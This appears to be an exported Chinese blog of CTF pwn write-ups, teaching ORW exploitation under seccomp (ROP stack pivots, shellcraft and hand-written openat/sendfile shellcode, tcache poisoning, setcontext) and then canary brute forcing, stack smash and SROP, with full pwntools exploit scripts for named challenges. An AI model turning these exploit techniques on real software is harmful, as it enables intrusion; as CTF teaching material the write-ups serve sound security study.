流程\n第一次我们泄露libc，用libc_base来求取open,read,write，为第二次的read的buf迁移做准备。\n\n这道题的核心就是第二次的buf迁移，因为要覆盖到ret地址需要0x108个字节，我们能利用的**只有0x28个字节**，因此我们需要迁移到bss区。\n\n这里的关键汇编指令是 ```lea rax, [rbp+buf]```，意为取[rbp+buf]的地址存储到rax中，而rax在下面又会赋值给rsi，相当于完成了迁移，就有足够的字节构造ORW了。\n![ 2024-05-27 185825.png](https://s2.loli.net/2024/05/27/yBhVxMoejmn37XC.png)\n```Python\npayload_migration = b'a'*0x100 + p64(elf.bss() + 0x300 + 0x100) + p64(lea_rax) #0x100个a覆盖到rbp，将rbp覆盖为bss + 0x400处，至于为什么要0x400分开成0x300+0x100，是为了更好理解，因为buf相对rbp的距离是0x100字节，加0x100是为了抵消这部分偏移，便于后面计算。lea_rax就是ret到它所处的地址\n```\n\n这是执行过该payload后的效果\n\n![ 2024-05-27 190301.png](https://s2.loli.net/2024/05/27/jhOSixQKw95X3NU.png)\n\n第三步就是纯粹的ORW链构造了，我直接放在完整payload里并解释好了\n##### Payload\n```Python\nfrom pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\np = process('./vuln')\n# p = remote('node5.anna.nssctf.cn',28996)\nelf = ELF('./vuln')\nlibc = ELF('./libc-2.31.so')\noffset = 0x100 + 0x08\npop_rdi = 0x401393 #file address\\fd\npop_ret = 0x40101a\nbss = 0x404300\nlea_rax = 0x4012CF #迁移read_buf\nputs_plt = elf.sym['puts']\nputs_got = elf.got['puts']\nmain_addr = 0x4012F0\nleave = 0x4012EE #栈迁移\n\npayload_leak = b'a' * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) #泄露puts的地址，返回main函数\np.recvuntil('Maybe you can learn something about seccomp, before you try to solve this task.')\np.send(payload_leak)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nlog.success('puts_real_addr==>' + hex(puts_real_addr))\nlibc_base = puts_real_addr - libc.sym['puts']\nlog.success('libc_base==>' + hex(libc_base))\nopen_addr = libc_base + libc.sym['open']\nlog.success('open_addr==>' + hex(open_addr))\nread_addr = libc_base + libc.sym['read']\nlog.success('read_addr==>' + hex(read_addr))\nwrite_addr = libc_base + libc.sym['write']\nlog.success('write_addr==>' + hex(write_addr))\npop_rdx = libc_base + 0x142c92 #设置可输入\\输出字节大小\npop_rsi = libc_base + 0x2601f #oflag,buf\n\npayload_migration = b'a' * (offset - 0x08) + p64(bss + 0x300 + 0x100) + p64(lea_rax)\n# gdb.attach(p)\np.recvuntil('Maybe you can learn something about seccomp, before you try to solve this task.')\np.send(payload_migration)\npause() #暂停一下是为了防止一次性输送太多数据导致传输错误，无法成功执行ORW\npayload = b'/flag\\00\\x00\\x00' + p64(pop_rdi) + p64(bss + 0x300) + p64(pop_rsi) + p64(0) + p64(open_addr) #rdi储存bss+0x300地址处的值，也就是我们的flag\npayload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x300) + p64(pop_rdx) + p64(0x100) + p64(read_addr) #从bss + 0x300处读取文件信息\npayload += p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(bss + 0x300) + p64(pop_rdx) + p64(0x100) + p64(write_addr) #将bss + 0x300处的数据输出出来\npayload = payload.ljust(0x100, b'\\x00')\npayload += p64(bss + 0x300) + p64(leave) #因为我们的ROP链在bss区上，所以我们要用栈迁移迁过去，至于为什么bss + 0x300没有减0x08，是因为开头输入了flag并对齐了8字节，无需再关注两次leave带来的rsp抬高0x08个字节\np.send(payload)\np.interactive()\n```\n### shellcraft模块的ORW\n众所周知，pwntools库里给我们提供了许多模块供我们进行脚本攻击，其中shellcraft也是我们常用的模块，常常被我们用于**ret2shellcode攻击**，但它**也可以被用来构造ORW链**，常见形式如下\n\n    shellcraft.open('/flag')\n    shellcraft.read(3,buf,n_bytes)\n    shellcraft.write(1,buf,n_bytes)\n\n相比于ROP链的攻击，它更为简单，因为我们不需要再寻找寄存器了。不过它的**条件也很苛刻**，必须是**可读可写可执行**的区域，所以它的**泛用性并不是那么广**\n#### 例题 第二届贺春杯 shellcode\n一如既往看看程序运行逻辑\n\n![ 2024-05-27 192850.png](https://s2.loli.net/2024/05/27/8aNxWPme7XA912V.png)\n![ 2024-05-27 192859.png](https://s2.loli.net/2024/05/27/9pt21A5QFXdjirH.png)\n\n![ 2024-05-27 192938.png](https://s2.loli.net/2024/05/27/qIlxa4MJiVktUse.png)\n\n嗯，半shellcode半ORW，题目映射了一段可读可写可执行的地址，那么就很简单了，先往addr里塞用shellcraft编写的ORW链，然后从buf跳到addr即可\n##### Payload\n```Python\nfrom pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\np = process('./shellcode')\nshellcode_addr = 0x196082000\nbss_addr = 0x404080\noffset = 0x10 + 0x08\nshellcode = shellcraft.open('./flag\\x00')\nshellcode += shellcraft.read(3, shellcode_addr + 0x300,0x200)\nshellcode += shellcraft.write(1,shellcode_addr + 0x300,0x200)\nshellcode = asm(shellcode) #别忘记用asm包裹，shellcraft编写的是机械码\np.recvuntil('magic!\\n')\np.sendline(shellcode)\npause()\npayload = offset * b'a' + p64(shellcode_addr)\np.sendline(payload)\np.interactive() \n```\n### 禁用ORW的部分函数写ORW\n\n#### sendfile\n\n普通的ORW太简单，**一般都会给你ban掉一部分跟ORW有关的函数**，open被ban了可以用openat代替，write没了可以用puts代替,read可以用readv等代替。这时候就是**考验攻击者对函数的熟练度了，有时候还需要汇编功底**\n##### 例题 XYCTF orw\n看着是一道很简单的ORW题，但是它的水很深，一不留神就掉坑里了\n![ 2024-05-27 194702.png](https://s2.loli.net/2024/05/27/AfStr4NobpcX5dU.png)\n![ 2024-05-27 194710.png](https://s2.loli.net/2024/05/27/zlFceIGUajMPS1q.png)\n![ 2024-05-27 194757.png](https://s2.loli.net/2024/05/27/u6owNrSyxiMjzt4.png)\n\n把ORW函数几乎给你ban了个遍，open还好说，但这read和write都ban的不成样了\n###### 坑\n想找两个函数来代替这俩，然后用ROP给执行了，但其实这也是这题的一个坑，因为...\n![image.png](https://s2.loli.net/2024/05/30/aD7JNuxIqbrSivg.png)\n得了，咱寄存器别找了，手搓汇编吧，但要找函数代替品也不简单...\n\n来看看它的``sendfile``代码\n```C\nssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);\n```\n\nsendfile是一个**用于在文件描述符之间高效传输数据的系统调用**，它在**两个文件描述符之间传输数据**而不**需要在用户空间进行数据缓冲**，从而提高性能\n\nout_fd表示的是目标文件描述符。**数据将被写入到这个文件描述符**，一般来是```stdout```(做堆的师傅们应该常见这玩意)，用于输出到屏幕，可以粗略理解为write的fd\n\nin_fd是源文件描述符，**数据将从这个文件描述符读取**，可以粗略理解为read的fd为3的情况\n\noffset不必多言，就是**从文件内容offset字节处开始读取**\n\ncount也不必多言，n_bytes\n\n了解完了这些就可以手搓汇编了\n\n###### Payload\n```Python\nfrom pwn import *\n\ncontext(log_level='debug', arch = \"amd64\",os= 'linux',terminal = ['tmux','splitw','-h'])\n\np = process('./vuln')\n#p = remote(\"xyctf.top\",60030 )\nlibc  =ELF(\"./libc.so.6\")\nelf = ELF('./vuln')\n\ndef convert_str_asmencode(content: str):\n    out = \"\"\n    for i in content:\n        out = hex(ord(i))[2:] + out\n    out = \"0x\" + out\n    return out #将str转换为十六进制数，并在开头补上\"0x\"\n\n\nif p.recvline()==b'show your magic again\\n':\n    shellcode=f\"\"\"\n    xor rsi,rsi;\n    mov rbx,{convert_str_asmencode(\"/flag\")};\n    push rbx;\n    mov rdx,0;   #设置oflag为0\n    mov r10,0;\n    mov rdi,3;   #文件描述符3\n    mov rsi,rsp\n    mov eax,257; #openat的系统调用号\n    syscall;\n\n    mov rsi,3;  #in_fd\n    mov r10,50; #n_bytes\n    xor rdx,rdx;\n    mov rdi,rdx;\n    inc rdi;    #out_fd\n    mov eax,40; #sendfile的系统调用号\n    syscall;\n\n    mov rdi,0;\n    mov rax,60; #exit\n    syscall\n    \"\"\"\n    payload1 =asm(shellcode)\n    p.send(payload1)\n    p.interactive()\n```\n效果如下\n![ 2024-05-27 200827.png](https://s2.loli.net/2024/05/27/OHALjlQYCwIsozn.png)\n![ 2024-05-27 200948.png](https://s2.loli.net/2024/05/27/ghUn57oifscbA8S.png)\n![ 2024-05-27 201100.png](https://s2.loli.net/2024/05/27/ZzlguI691ytkDcb.png)\n\n### 禁用open和openat\n\n#### 例题 2024强网杯初赛 baby_heap\n\n因为没保存草稿又懒得再重新写一遍，我就直接发[链接]([奇安信攻防社区-记一道强网杯Pwn题——baby_heap](https://forum.butian.net/share/3896))，也是我写的\n\n## 堆上的ORW\n不仅栈上有ORW，堆上当然也有ORW，不过堆上的ORW调用情况比栈上的更麻烦，要考虑的变量多了\n### 纯ROP链的ORW\n这个“纯”的意思是没有配合其它函数，而是通过单纯控制堆块来在程序返回地址处来ORW。\n#### 原理\n这种ORW通常都是**通过environ函数（环境变量）泄露出当前函数的返回地址**，通过修改bins中堆的fd指针为ret，申请到该地址后，在后面布置ORW的ROP链来获得flag\n#### 例题 [CISCN 2022 华东北]bigduck\n来看看程序是什么样的\n\n经典menu题(所有的函数名和变量名我自己已经改过了)\n\n![ 2024-05-27 211702.png](https://s2.loli.net/2024/05/27/lausEqIC398HY1P.png)\n\n仅申请堆而没有操作\n\n![ 2024-05-27 211733.png](https://s2.loli.net/2024/05/27/k6hYP5NfjBrsDEF.png)\n\n经典UAF漏洞\n\n![ 2024-05-27 211746.png](https://s2.loli.net/2024/05/27/mRfsPuEq5zAJn6X.png)\n\n普通show\n\n![ 2024-05-27 211753.png](https://s2.loli.net/2024/05/27/ZN7xaDe53T46EVR.png)\n\nedit函数可改变大小并输入内容\n\n![ 2024-05-27 211758.png](https://s2.loli.net/2024/05/27/zGEavwpeJTIHh6g.png)\n\n有计时，开了沙箱，要ORW\n\n![ 2024-05-27 211714.png](https://s2.loli.net/2024/05/27/TaicSkOPIUXNMuh.png)\n\n![ 2024-05-27 212114.png](https://s2.loli.net/2024/05/27/uz9iblEtRgycsJ1.png)\n\n##### 流程\n通过程序可以看出，这是一道经典的UAF的menu题，虽然这题libc版本较高，为2.33，但hook函数还没被扬，但是**很难用setcontext+orw**，因为2.29及之后**setcontext有些改变，使这样的ORW比较难以利用,gadget不好找**，所以我们只能采用这种ORW。利用edit和show函数，在申请进入environ函数体内后，就可以通过show计算出edit_ret，从而布置ROP链，这就是大概思路了\n###### leak_libc和heap_base\n先放这一阶段的Payload\n```Python\ndef add():\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'1')\n\ndef delete(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'2')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n\ndef show(index):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'3')\n    p.recvuntil(b'Idx: \\n')\n    p.sendline(str(index))\n\ndef edit(index,content):\n    p.recvuntil(b'Choice: ')\n    p.sendline(b'4')\n    p.recvuntil(b'Idx: ')\n    p.sendline(str(index))\n    p.recvuntil(b'Size: ')\n    p.sendline(str(len(content)))\n    p.recvuntil(b'Content: ')\n    p.send(content)\n\nfor i in range(8):\n    add() #0-7\nadd() #8\nfor i in range(8):\n    delete(i)\nedit(7, b'a')\nshow(7)\nmain_arena = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x60 - 0x61 #还要edit个a的原因是'\\x00'截断，所以还要再show的基础上减去0x61(a的ASCII值)\nlog.success('main_arena==>'+hex(main_arena))\nmalloc_hook = main_arena - 0x10\nlog.success('malloc_hook==>'+hex(malloc_hook))\n\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\nenviron = libc_base + libc.sym['_environ']\nlog.success('environ==>'+hex(environ))\n\nshow(0)\nheap_base = u64(p.recv(5).ljust(8,b'\\x00')) << 12 #高版本libc会移位和异或fd指针，不过show出来只用移位\nlog.success('heap_base==>'+hex(heap_base))\n\nstack_ptr = (heap_base >> 12) ^ environ #加进去的时候必须得移位加异或，因为libc会对fd指针进行操作\nlog.success('stack_ptr==>'+hex(stack_ptr))\nedit(6,p64(stack_ptr))\nadd() #9\nadd() #10\nshow(10)\nstack = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) #environ函数里存有程序的环境变量，通过环境变量能够计算出edit函数的ret地址\nlog.success('stack==>'+hex(stack))\nstack_base = stack - 0x138 #edit函数中rsp的位置\nlog.success('stack_base==>'+hex(stack_base))\n```\n给几个关键步骤的截图，方便更好理解\nshow(0)时泄露heap_base,如果不移位，会造成heap_base泄露错误\n\n记住这个environ和stack_ptr\n\n![ 2024-05-27 214042.png](https://s2.loli.net/2024/05/27/PcfQOGYoC6kb5ML.png)\n![ 2024-05-27 214204.png](https://s2.loli.net/2024/05/27/eMJ5w72UsWoH9gK.png)\n\n在经过edit之后，看它的fd指针和实际的内容\n\n![ 2024-05-27 214313.png](https://s2.loli.net/2024/05/27/FMzfAUdKEy2QaWx.png)\n\n这就是它对堆内容进行了移位和异或的操作，实习内容和fd指针指向的位置是不一样的，是高版本的保护机制\n\n###### ORW\n泄露出栈地址就好说了，先把两个堆块给free出来，用来继续伪造chunk。往edit_ret里编辑ORW即可\n```Python\npop_rdi = libc_base + 0x28a55\npop_rsi = libc_base + 0x2a4cf\npop_rdx = libc_base + 0xc7f32\npop_ret = libc_base + 0x26699\nopen_addr = libc_base + libc.sym['open']\nread_addr = libc_base + libc.sym['read']\nputs_addr = libc_base + libc.sym['puts']\nflag_addr = heap_base + 0x5d0 #flag字符所在地址\n\nedit(3,b'/flag\\x00')\n\norw = p64(0) * 3 + p64(pop_ret) + p64(pop_rdi) + p64(flag_addr) +p64(pop_rsi) + p64(0) + p64(open_addr)\norw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_base + 0x300) + p64(pop_rdx) + p64(0x100) + p64(read_addr)\norw += p64(pop_rdi) + p64(heap_base + 0x300) + p64(puts_addr)\n\ndelete(8)\ndelete(9) #放进tcache_bins里伪造chunk\nedit(9, p64((heap_base >> 12)^stack_base)) #申请进edit的栈里\nadd()\nadd()\nedit(12,orw) #构造ORW\n\np.interactive()\n```\n最终效果如下\n\n![ 2024-05-27 215051.png](https://s2.loli.net/2024/05/27/HeYLrEJqxFyW5h2.png)\n![ 2024-05-27 215115.png](https://s2.loli.net/2024/05/27/NTG8hjfc9PQrUvJ.png)\n\n### setcontext+ORW\n这个攻击方式主要利用setcontext函数，通过rdi寄存器控制其它寄存器，主要是利用```mov rsp, qword ptr [rdi + 0xa0]```，实现栈的迁移\n#### setcontext\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427104507741-953595500.png)\n我框红的就是关键的地方，要提前设置好[rdi+0xa0]的内容，使我们的rsp迁过去，要在迁过去之前设置好ORW链。\n#### 例题 [CISCN 2021 初赛]silverwolf\n一如既往看程序\n\n嗯，还是menu\n\n![ 2024-05-27 220016.png](https://s2.loli.net/2024/05/27/LYXeNIUjokb6ASE.png)\n\nadd函数限制了我们的size大小，只能是tcache，并且不允许设置index\n\n![ 2024-05-27 220034.png](https://s2.loli.net/2024/05/27/oIy4hJjcM9K1gVB.png)\n\nUAF，不能选择index\n\n![ 2024-05-27 220039.png](https://s2.loli.net/2024/05/27/G4tYSXkNhFi3VZP.png)\n\nshow，只show最近创造的chunk的内容\n\n![ 2024-05-27 220044.png](https://s2.loli.net/2024/05/27/97bChAdw2iLZBPU.png)\n\n平平无奇edit，但是也只能edit最新创造的chunk\n\n![ 2024-05-27 220050.png](https://s2.loli.net/2024/05/27/3hsdqyToaL6NGQp.png)\n\n##### 流程\n这道题限制了我们的寻址，使我们只能操作最近申请的堆块，看似走投无路，其实还有一条小路可走，那就是劫持tcache_perthread_struct\n###### tcache_perthread_struct\n它是**在libc-2.27之后加入的，用于管理tcache_bins**，大小一般为0x250或0x290\n\n源码\n```C\n#define TCACHE_MAX_BINS 64\n/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n} tcache_entry;\n\n/* There is one of these for each thread, which contains the\n   per-thread cache (hence \"tcache_perthread_struct\").  Keeping\n   overall size low is mildly important.  Note that COUNTS and ENTRIES\n   are redundant (we could have just counted the linked list each\n   time), this is for performance reasons.  */\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n```\n我们可以看到，该结构体有两个数组，一个是**counts**，另一个是**entry**\n\ncounts的数组记录的是**tcache上各个bin上的堆个数**，总大小为**64字节**\n\nentry储存的是**各个指针**，存储的是**各个bin链表上的首chunk的fd指针**\n而entry就储存在counts之下\n\nentry数组和counts数组都是我们的攻击目标，通过**修改counts和entry，我们就能操控tcache_bins**\n\n###### 劫持tcache_perthread_struct\n```Python\ndef add(size):\n    p.sendlineafter('Your choice: ',str(1))\n    p.sendlineafter('Index:',str(0))\n    p.sendlineafter('Size:',str(size))\n\ndef edit(content):\n    p.sendlineafter('Your choice: ',str(2))\n    p.sendlineafter('Index:',str(0))\n    p.sendlineafter('Content:',content)\n\ndef show():\n    p.sendlineafter('Your choice: ',str(3))\n    p.sendlineafter('Index:',str(0))\n\ndef delete():\n    p.sendlineafter('Your choice: ',str(4))\n    p.sendlineafter('Index:',str(0))\n\nadd(0x78)\ndelete()\nshow() #chunk的fd指针\n\np.recvuntil('Content: ')\nheap_addr = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('heap_addr==>'+hex(heap_addr))\nheap_base = heap_addr - 0x11b0 #heapbase，也是tcache_perthread_struct的prev与size域，不可修改，否则报错\nlog.success('heap_base==>'+hex(heap_base))\nedit(p64(heap_base + 0x10))\nadd(0x78)\nadd(0x78) #申请进入了，此时已经劫持了该结构体\n```\n因为**只能操作最近申请的chunk**，所以我们若是想在堆块里布置ORW链，我们就**需要能一次性对多个堆块进行操作**，而tcache_perthread_struct恰好能满足我们想要的这个条件，所以首先就是要劫持它。\n\n###### 泄露libc\n这里提供两种方案，一种是直接填满tcache_bins使tcache_perthread_struct进入unsorted_bins；另一种是伪造counts数组使其误以为0x250的bins已经满了，从而再free一次就可以进入unsorted_bins。\n\n先第一种\n```Python\nfor i in range(7):\n    delete() #addr==>heap_base + 0x10\n    edit(p64(0) * 2) #恢复counts数组结构，因为每次free都会有fd指针产生，我们并不需要它，所以得把它破坏掉，使我们能持续free\ndelete() #free tcache_perthread_struct into unsorted bins\nshow()\nmain_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 96 \nlog.success('main_arena==>'+hex(main_arena))\nmalloc_hook = main_arena - 0x10\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc_base = malloc_hook - libc.symbols['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\n```\n\n第二种\n```Python\nedit(p64(0) * 4 + p64(0x0000000007000000)) #伪造counts数组，使其以为0x250的tcache_bins已被填满，下一次free的时候会把tcache_perthread_struct弄进unsorted_bins\ndelete()\nshow()\n```\n\n这两种选哪种都可以，我个人习惯第一种。第二种比较麻烦的一点是要测准counts数组分别对应哪个大小的tcache_bins，不如第一种简单\n\n###### 布置堆块\n有了libc_base和heap_base，我们就需要布置堆块了。以往的堆块都能根据索引来进行操作，但这道题不行，这时就需要发挥tcache_perthread_struct的作用了。entry管理各个tache_bins链表上的首chunk的fd指针，那么我们只需要对entry进行修改，就能布置任意堆块，达成我们想要的攻击效果，先看代码\n```Python\nedit(b'\\x00' * 0x78) #修改counts，并把entry的一些指针清空\n\nrax = libc_base + 0x43ae8\nrdi = libc_base + 0x215bf\nrdx = libc_base + 0x1b96\nrsi = libc_base + 0x23eea\nfree_hook = libc_base + libc.symbols['__free_hook']\nread = libc_base + libc.symbols['read']\nwrite = libc_base + libc.symbols['write']\nsyscall = libc_base + 0xe5965\nmov_rsp_rdi_a0 = libc_base + libc.sym['setcontext'] + 53\nlog.success('mov_rsp_rdi_a0==>'+hex(mov_rsp_rdi_a0))\nflag_addr = heap_base + 0x1000 #存放flag字符串的地址，也是我们要用到的伪堆块\nret = libc_base + 0x8aa #ret进我们布置好的orw1中\norw1 = heap_base + 0x3000 #orw1用来布置前半部分ORW链，因为我用到的大小只有0x60，塞不下完整Payload\norw2 = heap_base + 0x3060 #下一半ORW链\nlog.success('orw1==>'+hex(orw1))\nlog.success('orw2==>'+hex(orw2))\nfake_orw1 = heap_base + 0x2000 #用于触发setcontext\nfake_orw2 = heap_base + 0x20a0 #用于存储orw1和ret\nlog.success('fake_orw1==>'+hex(fake_orw1))\nlog.success('fake_orw2==>'+hex(fake_orw2))\n\npayload = b'\\x00' * 0x40 #repair the counts,which is 64 byteds,another solution is p64(0) * 4 + p64(0x0000000000000000)\npayload += p64(free_hook) + p64(0) #0x20 0x30\npayload += p64(flag_addr) + p64(fake_orw1) #0x40 0x50\npayload += p64(fake_orw2) + p64(orw1) #0x60 0x70\npayload += p64(orw2) #0x80\n#这个Payload的意思是布置堆块，从0x20-0x80这一大小的堆块\nedit(payload) #此时我们控制的堆块依旧是tcache_perthread_struct，所以我们直接edit就好\n```\n至于为什么不直接用ORW链而伪造两个fake_orw，有两个原因。\n\n其一，我们不能直接修改链表为ORW链，会出现未知的错误。\n\n其二，是为了我们的setcontext，用setcontext来迁rsp，达到一种迁栈的效果，ret到这个地址上，就可以完成ORW\n###### 完成ORW\n在前面，我们已经完成好了堆块的布局，我们只需根据对应的堆块名称执行对应的操作即可，先看堆块的布局\n\n![ 2024-05-28 091253.png](https://s2.loli.net/2024/05/28/KOcTpUDAoxCn4dz.png)\n\n![ 2024-05-28 091312.png](https://s2.loli.net/2024/05/28/TJw9OLxvPfSyAeN.png)\n\n与我们需要用到的地址别无二致，那么此时我们只需要完成如下操作\n```Python\n\t0x20 free_hook-->setcontext\n\t0x40 存储flag\n\t0x50 调用free\n\t0x60 跳转至orw\n\t0x70 orw的前半部分（因为size只有0x60）\n\t0x80 orw的后半部分\n```\n就可以成功getshell了！\n```Python\n#orw\nshellcode = p64(rdi) + p64(flag_addr) + p64(rsi) + p64(0) + p64(rax) + p64(2) + p64(syscall) #open\nshellcode += p64(rdi) + p64(3) + p64(rsi) + p64(orw1) + p64(rdx) + p64(0x100) + p64(read) #read\nshellcode += p64(rdi) + p64(1) + p64(write) #write\n\nadd(0x18) #free_hook\nedit(p64(mov_rsp_rdi_a0)) #setcontext+0xa0的位置\nadd(0x38) #edit flag\nedit(b'/flag\\x00')\nadd(0x68) #orw1\nedit(shellcode[:0x60]) #orw的前半部分\nadd(0x78) #orw2\nedit(shellcode[0x60:]) #orw的后半部分\nadd(0x58) #fake2\nedit(p64(orw1) + p64(ret)) #\nadd(0x48) #fake1\ndelete()\n\np.interactive()\n```\n![ 2024-05-28 092258.png](https://s2.loli.net/2024/05/28/EIvYm6sCyDGqQnb.png)\n\n不过这种攻击目前限于libc-2.29之前，2.29的setcontext控制的寄存器就变成rdx,需要找gadget实行rdi和rdx之间的转换，比之前更麻烦，需要合适地址，条件比较苛刻。而2.31要用rdx控制各种寄存器的地址变成了setcontext+0x61。\n# 总结\nORW的形式多种多样，多做做题应该就能认识个七七八八了，还是得靠练","tags":["Stack","Pwn","Heap"],"categories":["网络安全"]},{"title":"ret2text进阶","url":"/2023/12/19/ret2text进阶/","content":"\n\n\n# stack smash\n\n## 造成原因\n当进行栈溢出时，**触发了__stack_chk_fail**，从而拦截了该栈溢出，使程序崩溃\n![image]()\n\n![image](https://s2.loli.net/2024/12/03/cuTBQm8gP7pkJw9.png)\n\n## 利用原理\n 我们首先了解一下__stack_chk_fail函数的构成\n __\n\n\n\n![image](https://s2.loli.net/2024/12/03/M6PovClyWBugELd.png)\n\n__发现调用了__fortify_fail函数，那我们再看下这个函数\n\n\n![image](https://s2.loli.net/2024/12/03/old9U5RKCYGyF7f.png)\n\n发现有两个参数，一个是msg(信息，也就是前边的\"stack smashing detected\")，另一个是__libc_argv[0]，这其实是主函数里的一个参数，保存了我们的程序名\n那么我们的方法就是，将__libc_argv[0]的地址替换为flag所在的地址，这样在进行检测报错后就可以直接将flag给打印出来（一般而言都是有open函数打开了一个flag文件然后读入)\n\n## 使用方式\n在动态调试中，往gets/read函数处（**注意函数里边的参数是什么**）下断点后进行栈溢出，退出输入函数后使用stack**计算程序名读入的地址与rsp指向的地址之间的偏移量**，将发送等同于偏移量大小的垃圾数据后进行地址跳转即可\n形式如\n```Python\npayload = offset * b'a' + p64(flag_addr)\n```\n## 局限性\n在**glibc-2.23及之前的版本可用**，但在glibc-2.27及之后的版本，因为stack_chk_fail或fortify_fail源代码的中一些**参数的变化**，导致了stack smash这样的方法无法通过检测，再也行不通\n有且仅有在**flag文件内置**于程序内可用\n\n# 多进程爆破（多用于爆破Canary)\n## 原理\nfork函数会在父进程中创建子进程并**完全复制父进程的地址空间的内容**，如果**成功**，fork函数会在子程序**返回0**，若**出错**则会**返回负值**。因为完全复制的特性，所以**子进程和父进程的Canary是一样的**，如果在**循环**中调用了fork函数，可以根据函数特性**爆破Canary**的值\n## 利用方式\nCanary默认的**最低字节是'\\x00'**，因此我们只用**爆破前七个字节**就够了。然后构造payload\n基础形式\n```Python\ncanary = '\\x00' #默认最低字节已经是\\x00\nfor first in range(7): #第一重循环，七次，对应爆破七个字节\n    for bit in range(0x100): #第二重循环，每个字节有0x00到0xFF的取值，所以要循环0x100次\n\tp.send(offset_buf_to_canary * 'a' + canary + chr(bit)) #覆盖到canary地址处，首先输出'\\x00'，而后通过chr函数将unicode编码转换成对应字符，如果字符和canary对应，则可以通过canary检测\n\tstring_in_father = p.recvuntil('fork函数里的字符串内容') #具体情况具体分析\n\tif 'fork函数之后的字符串（如果有的话）' in string_in_father: #判断条件，用于爆破出正确的canary值\n\t    canary += chr(bit) #正确的话，加上一字节\n\t\tprint(hex(u64(canary.ljust(8,b'\\x00')))) #在十六进制下输出被解包的canary，左对齐，不足八位用'\\x00'补齐\n\t\tbreak\n```\n像p.recvuntil和string_in_father其实是可变的，甚至可以说是不一定有的，要根据**具体情况具体分析**，这只是个大致模板，真要做还得慢慢分析\n\n## 局限性\n爆破**很慢**，因为循环次数多，而且每次都要判断，导致爆破出canary的过程极其漫长，有这时间都可以去做别的题目了\n**条件苛刻**，首先得有fork函数，其次还要循环调用，缺一不可\n# stack pivot(栈迁移)\n## 原理\n构造一条恶意的ROP链，将rbp，rsp**迁移到这含有这条恶意的ROP链的栈**（通常是**bss区**上，且有**可执行权限**）上，控制执行流\n这其中很重要的就是leave指令的应用\n```\nleave -> mov rsp,rbp\n         pop rbp\n```\n还有ret，ret返回的地址是栈顶数据，而栈顶由rsp决定，我们只要控制了rsp，我们也就控制了ret返回的栈顶数据\n## 利用方式\n在read/gets函数溢出后，如果有canary就接收canary，而后接收栈地址，然后构造第一次的payload\n以puts函数泄露libc_base为例(攻击的基础样式)\n```Python\nelf = ELF('该程序的绝对路径/相对路径')\npayload_first = p64(pop_rdi_addr) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr) #泄露基地址\npayload_first += payload.ljust(offset_from_buf_to_canary,b'\\x00') #将垃圾数据恰好填指储存canary的地址前\npayload_first += p64(canary) + p64(stack) + p64(leave_retn_addr) #stack要记得在接收时减去offset_from_rbp_to_rsp并且再减去8。注意，我们把ret的地址覆盖成leave_ret，相当于执行了两次leave，第一次时rbp指向stack，而rsp指向了第二个leave，第二次leave把rbp指向的stack的地址赋值给了rsp，我们就控制了rsp跳转的地址了，但是第二次的'pop rbp'是多余的，会抬高rsp八字节，所以在构造stack数据时，要考虑把数据放到rsp-8的位置，最后ret的时候rsp会把指向内存的内容赋值给rip，让rip去执行\n```\n通过泄露出的libc_base可以通过对应版本的libc.so文件调用任意函数，将system函数和bin/sh迁移到stack上，再将rsp迁移到stack上即可。但是在**第二次进入main函数的时候，栈会被抬高**，因此我们需要计算抬高的栈距离我们第一次泄露的栈的距离，在read/gets函数里能看到buf的地址，从而**算出offset**的值，就可以构造第二次的payload的了\n```Python\nstack = stack - offset - 8 #第二次时的栈的地址\npayload_second = p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\npayload_second = payload_second.ljust(offset_from_buf_to_canary,b'\\x00')\npayload_second += p64(canary) + p64(stack) + p64(leave_ret_addr)\n```\n## 优点\n**所需字节数较少**，适用于read读入字节不够的情况，当然，前提还是要能进行栈溢出\n## 条件\n仍需要栈溢出\n**存在可控制内容的内存，并且需要能够泄露出基地址**\n# SROP（早期应该不怎么会见得到这玩意）\n## 原理\n这个玩意我觉得我解释不清，直接甩佬的链接就好了\n> https://xz.aliyun.com/t/12790\n## 利用方式\n在Linux i386下调用sigreturn的代码存放在vdso中（暂不研究，主讲x86_64）\n在Linux x86_64下，**系统调用号为15的syscall为sigreturn**，题目里如果在汇编代码里有设置**rax为15的话（mov rax,15)**，很大可能就是要利用SROP进行攻击了\n常见模板\n```Python\nframe = SigreturnFrame() #pwntools集成了这种攻击方式\nframe.rax = 59 #execve()的系统调用号为59，如果找不到合适的系统调用号，就可以看能不能通过read控制rax的值\nframe.rdi = 写有'bin/sh\\x00'的地址 #如果是bss，直接写bss区地址即可；若在栈上，则还需泄露栈地址\nframe.rip = syscall_addr\nframe.rsi = 0\npayload = \"bin/sh\\x00\" * offset + p64(syscall_addr) + p64(15) + str(frame)\n```\n## 优点\n可以直接getshell\n可以orw\n可以执行mprotect进而利用shellcode来orw\n## 